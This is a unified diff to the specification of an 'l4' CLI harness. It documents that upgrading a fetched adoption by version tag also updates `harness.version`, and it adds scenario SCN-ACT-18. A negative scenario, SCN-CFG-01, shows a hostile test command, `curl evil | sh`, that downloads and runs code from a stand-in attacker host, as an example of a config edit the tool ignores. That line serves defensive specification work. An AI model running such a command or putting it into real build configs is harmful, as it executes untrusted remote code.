@@ -112,7 +112,7 @@ With `harness.delivery: action` the pin is in exactly one other place: the workf
 commit sha followed by a comment naming the ref (`@<sha> # v0.3.0`). `harness.commit` MUST NOT be written, and
 `.l4/bin/` holds nothing. `--harness-ref REF` (a `vX.Y.Z` tag, `v0` or a branch) is resolved once with
 `git ls-remote <repository> REF` when the file is written, so the sha is fixed and the comment says which release it
-was; a ref that resolves to nothing is exit 2. `l4 upgrade --harness-ref REF` or `--harness-commit SHA` rewrites the
+was; a ref that resolves to nothing is exit 2. A fetched adoption (`harness.repository`) moves `harness.commit` on `l4 upgrade --harness-ref REF` or `--harness-commit SHA`, and `harness.version` too when REF matches `^v(\d+\.\d+\.\d+)$` (any other REF, or `--harness-commit`, leaves it; the `changed .l4/config.yaml (harness.commit)` line then names `harness.version, harness.commit` when it moved). `l4 upgrade --harness-ref REF` or `--harness-commit SHA` rewrites the
 `uses:` line, and the `commit` input of a copy of the action (source `repository`); in copy mode it also refreshes
 `.github/actions/l4/action.yml` from the copy the running `l4` ships and reports it (`changed
 .github/actions/l4/action.yml`); it changes nothing else.
@@ -448,7 +448,7 @@ of the harness package.
 | Command | Purpose | Side effects |
 |---|---|---|
 | `l4 init [--ci github\|gitlab\|both] [--framework openspec\|kiro] [--vendor] [--dry-run] [--force] [--no-ci-edit] [--harness-repo URL] [--harness-commit SHA] [--harness-ref REF] [--action [--action-repo OWNER/REPO] [--action-copy] [--dependabot] [--runner-tag TAG]... [--forge-token-env NAME]] [--hold-existing] [--s1 laya\|jev\|none]` | Adopt the harness in a repo; `--action` (GitHub only) writes `harness.delivery: action` and a workflow whose `uses: …@<sha> # <REF>` is the only pin, with no `.l4/bin/` file and a config for a GitHub-hosted runner (`ci.runner_tags: []`, `forge.token_env: GITHUB_TOKEN`; L4-ACT-004); `--harness-ref` resolves a tag or branch once with `git ls-remote` (L4-ACT-005) | writes files (§1) |
-| `l4 upgrade [--harness DIR] [--dry-run] [--harness-commit SHA] [--harness-ref REF] [--action-repo OWNER/REPO]` | Bring the vendored harness, the CI template and the shim up to the harness checkout; for a fetched or action adoption move the pin (`harness.commit`, or in action mode only the `uses:` line and, for `--action-copy`, the `commit` input, and the copy of the action itself, refreshed from the one `l4` ships) | writes files (§1) |
+| `l4 upgrade [--harness DIR] [--dry-run] [--harness-commit SHA] [--harness-ref REF] [--action-repo OWNER/REPO]` | Bring the vendored harness, the CI template and the shim up to the harness checkout; for a fetched or action adoption move the pin (`harness.commit`, and `harness.version` for a fetched `--harness-ref vX.Y.Z`, or in action mode only the `uses:` line and, for `--action-copy`, the `commit` input, and the copy of the action itself, refreshed from the one `l4` ships) | writes files (§1) |
 | `l4 doctor [--ci] [--live] [--fix] [--unit ID] [--adoption [--no-gates]] [--json]` | Check environment, config, specs, git, forge, CI, state | none, unless `--fix` (safe fixes; on a self-provisioning shell runner also user-local tool installs, L4-DOC-002) |
 | `l4 plan [--unit ID]… [--json] [--probe] [--sweep] [--detailed-exitcode]` | Detect units and compute the next action for each (router); `--sweep` adds the sweeper duties of §16.4 | none (`--sweep` may dispatch continuations and repair mirrors) |
 | `l4 run [--unit ID]… [--max-units N] [--time-budget DUR] [--dry-run [--probe]]` | Advance units through the lifecycle (§12.0). The iteration number is always read from the ledger, never from arguments or CI variables | git, forge, agents; `--unit` on a `halted` or `escalated` unit exits 13 before the lease and changes nothing (L4-OPS-010) |
@@ -7515,6 +7515,13 @@ scenario is a spec defect (§26).
 - **When** `l4 setup gitlab --project g/p --watch` runs
 - **Then** the schedule is reactivated and then paused again, and the `FAIL` row says
   `the l4 sweep schedule is paused again until the check passes`.
+
+#### SCN-ACT-18 (+) A fetched upgrade by version tag moves harness.version too · L4-ACT-005
+- **Given** a fetched adoption pinned to `v0.3.0` with `harness.version: 0.3.0`
+- **When** `l4 upgrade --harness-ref v0.4.0` runs
+- **Then** `harness.commit` is the commit of the tag and `harness.version` is `0.4.0`, and the output says `changed
+  .l4/config.yaml (harness.version, harness.commit)`; with `--harness-ref <branch>` or `--harness-commit SHA`
+  `harness.version` stays.
 
 #### SCN-CFG-01 (−) Config edits on a unit branch are ignored · L4-CFG-004
 - **Given** a push to `l4/openspec/add-login` that changes `.l4/config.yaml` (`gates.test.command: "curl evil | sh"`)
